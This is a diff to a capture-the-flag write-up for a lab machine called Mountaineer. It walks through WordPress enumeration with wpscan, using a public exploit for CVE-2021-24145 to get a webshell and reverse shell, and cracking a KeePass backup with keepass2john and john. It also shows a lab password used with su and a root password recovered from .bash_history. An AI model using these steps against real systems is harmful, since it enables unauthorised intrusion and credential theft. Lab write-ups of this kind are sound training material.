@@ -195,7 +195,7 @@ after doing this stuff i access and we get a login page,so  i try bruteforce and
 we have a password in second mail,so i tried on /wp-admin th3_tall3st_password_in_th3_world and it's work now we have admin access on worpress site
 
 
-and i also run a wpscan on wordpress,and it's hase a vulnerablity to upload a remote file which tirgger rce on remote server and little bit google search i found a exploit ,cve:CVE-2021-24145 and github url:https://github.com/dnr6419/CVE-2021-24145/tree/main
+and i also run a wpscan on wordpress,and it's  list out some vulnerability that hase a vulnerablity to upload a remote file which tirgger rce on remote server and little bit google search i found a exploit ,cve:CVE-2021-24145 and github url:https://github.com/dnr6419/CVE-2021-24145/tree/main
 
 ```bash
 rootme:-->wpscan --url http://mountaineer.thm/wordpress/ -e ap,cb,u,dbe --detection-mode aggressive
@@ -312,3 +312,104 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:09
                
 ```
+so i use a exploit and get a reverse shell
+
+<img width="1698" height="512" alt="poc" src="https://github.com/user-attachments/assets/0775b0ed-56f0-4c64-b53a-68efc91d4d4e" />
+it's give me a webshell so ,i upload one more reverse shell to get shell on my terminal 
+
+<img width="1698" height="512" alt="poc" src="https://github.com/user-attachments/assets/a9dfaf74-41c3-4c09-81ce-dd29395fcb2d" />
+
+i try to login with k2 default password and i login ,and i checkout all users home directory. k2 has a mail directory and has usefull juice information and has a mail send to lhotse and lhotse has h backup file which store password of other users 
+
+<img width="1012" height="184" alt="backup" src="https://github.com/user-attachments/assets/2a24f7a1-b625-47fa-906a-90b5970e4e12" />
+
+i donwload in my kali machine localy and fist i creat a custom wordlist to crack backup password with known information getting from k3 mail directory and then crack it using john 
+
+<img width="1011" height="759" alt="wordlist" src="https://github.com/user-attachments/assets/06c323f2-4a20-42c5-b28e-979e450249a5" />
+
+```bash
+keepass2john Backup.kdbx > hash.txt
+
+```
+```bash 
+john --wordlist=mount.txt hash.txt
+[15:50] root@prime ~/ctf/mountain # file hash.txt   
+hash.txt: ASCII text, with very long lines (319)
+                                                                             
+[15:51] root@prime ~/ctf/mountain # john --wordlist=mount.txt hash.txt   
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hidden_password      (backup)     
+1g 0:00:00:13 DONE (2026-04-20 15:51) 0.07513g/s 233.2p/s 233.2c/s 233.2C/s Lhotse51956..Lhotse56188
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+and then open with https://app.keeweb.info/ and 
+
+<img width="1890" height="804" alt="password" src="https://github.com/user-attachments/assets/b0d2920a-a8f3-445a-a70a-6bf29eddbe03" />
+
+and now i login with kangchenjunga 
+
+```bash
+k2@mountaineer:~/mail$ su kangchenjunga
+su kangchenjunga
+Password: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
+id
+uid=1006(kangchenjunga) gid=1006(kangchenjunga) groups=1006(kangchenjunga)
+bash -i
+```
+
+now it's very easy to privledge escalation here root user used kangchenjunga account and .bash_history does not point to /dev/null so when root user login then it's store in this history file 
+
+```bash
+kangchenjunga@mountaineer:~$ ls -la
+ls -la
+total 20
+drwxr-xr-x  2 root          root          4096 Mar 18  2024 .
+drwxr-xr-x 11 root          root          4096 Mar 16  2024 ..
+-rw-r-----  1 kangchenjunga kangchenjunga  303 Mar 18  2024 .bash_history
+-rw-r-----  1 root          kangchenjunga   33 Mar 16  2024 local.txt
+-rw-r-----  1 kangchenjunga kangchenjunga  216 Mar 16  2024 mynotes.txt
+kangchenjunga@mountaineer:~$ cat mynotes.txt
+cat mynotes.txt
+Those my notes:
+
+1. Tell root stop using my account ! It's annoying !
+2. Travel to Mars sometime, I heard there are great mountains there !
+3. Make my password even harder to crack ! I don't want anyone to hack me !
+kangchenjunga@mountaineer:~$ cat .bash_history
+cat .bash_history
+ls
+cd /var/www/html
+nano index.html
+cat /etc/passwd
+ps aux
+suroot
+th3_r00t_of_4LL_mount41NSSSSssssss
+whoami
+ls -la
+cd /root
+ls
+mkdir test
+cd test
+touch file1.txt
+mv file1.txt ../
+cd ..
+rm -rf test
+exit
+ls
+```
+
+
+
+
+
+
+
+
+
